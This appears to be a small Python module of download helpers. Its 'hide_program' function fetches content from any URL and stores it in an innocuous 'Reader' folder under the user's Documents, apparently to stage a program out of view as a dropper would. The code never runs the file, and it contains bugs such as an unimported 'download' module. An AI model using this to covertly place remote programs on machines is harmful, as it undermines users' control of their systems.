import requests
import os

def download_raw_content(raw_link, file_path):

    response = requests.get(raw_link)

    try:
        with open(file_path, "wb") as f:
            f.write(response.content)
    
    except Exception as e:
        print(f"ERROR: {e}")


def file_check_create(filepath = None, content = None):
    
    if os.path.exists(filepath):
        print(f"file: '{filepath}' already exists.")


    elif filepath == None:
        return

    else:
        with open(filepath, "wb") as f:
            f.write(content)


def dir_check_create(filepath = None):
    if not(os.path.exists(filepath)):
        os.makedirs(filepath)
    
    else:
        print(f"dir: '{filepath}' already exists")


def hide_program(file_name, url):
    
    response = requests.get(url)
    
    documents = os.path.normpath(os.path.expanduser("~/Documents"))
    directory_path = f"{documents}\Reader"
    file_path = f"{directory_path}\{file_name}"

    download.dir_check_create(directory_path)
    download.file_check_create(file_path, response.content)